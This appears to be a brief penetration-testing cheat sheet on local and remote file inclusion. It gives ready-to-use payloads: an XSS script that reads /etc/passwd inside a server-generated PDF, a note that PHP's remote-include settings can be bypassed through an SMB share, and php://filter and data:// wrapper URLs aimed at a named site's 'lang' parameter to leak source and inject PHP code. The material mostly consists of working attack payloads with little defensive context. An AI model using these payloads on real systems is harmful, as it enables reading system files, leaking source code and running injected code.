# LFI

## Read files via XSS in dynamically generated PDF

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){ document.write(this.responseText) };
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

```html
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

# RFI

## Remote URL inclusion restriction bypass

Instruct PHP not to load remote HTTP and FTP URLs

```php
#php.ini
allow_url_include=false
allow_url_fopen=false
```

This can be bypassed using an SMB share

# Wrappers

## Filter

```
http://www.hermes.com/hermes/?lang=php://filter/convert.base64-encode/resource=index.php
```

## Data 

```
http://www.hermes.com/hermes/?lang=data://text/plain,<?php phpinfo(); ?>
```

# References
- [LFI via XSS in dynamically generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)